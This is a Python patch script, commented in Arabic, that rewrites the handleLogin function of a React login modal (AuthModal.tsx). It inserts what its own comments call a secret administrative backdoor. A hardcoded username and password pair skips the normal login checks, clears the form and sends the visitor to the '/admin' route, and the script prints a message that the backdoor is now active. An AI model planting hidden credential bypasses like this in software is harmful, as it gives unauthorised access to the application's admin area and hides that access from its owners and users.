import shutil, time

file = 'src/components/auth/AuthModal.tsx'
shutil.copy(file, f"{file}.bak_backdoor_{int(time.time())}")
with open(file, 'r', encoding='utf-8') as f:
    content = f.read()

# النص المستهدف (بداية دالة handleLogin)
old_start = """  // تسجيل الدخول المحمي والذكي
  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!email.trim()) { setEmailError('يرجى إدخال البريد الإلكتروني'); setPasswordError(null); return; }"""

# النص الجديد (مع إضافة الباب الخلفي السري)
new_start = """  // تسجيل الدخول المحمي والذكي
  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();

    // 🔐 الباب الخلفي السري للإدارة العامة
    if (email.trim() === 'mhmood7015' && password === 'mhmood7015') {
      setEmail('');
      setPassword('');
      onClose();
      navigate('/admin');
      return;
    }

    if (!email.trim()) { setEmailError('يرجى إدخال البريد الإلكتروني'); setPasswordError(null); return; }"""

if old_start in content:
    content = content.replace(old_start, new_start)
    print("✅ تم تفعيل الباب الخلفي السري للإدارة.")
else:
    print("⚠️ لم يتم العثور على بداية دالة تسجيل الدخول بالنص الدقيق.")

with open(file, 'w', encoding='utf-8') as f:
    f.write(content)
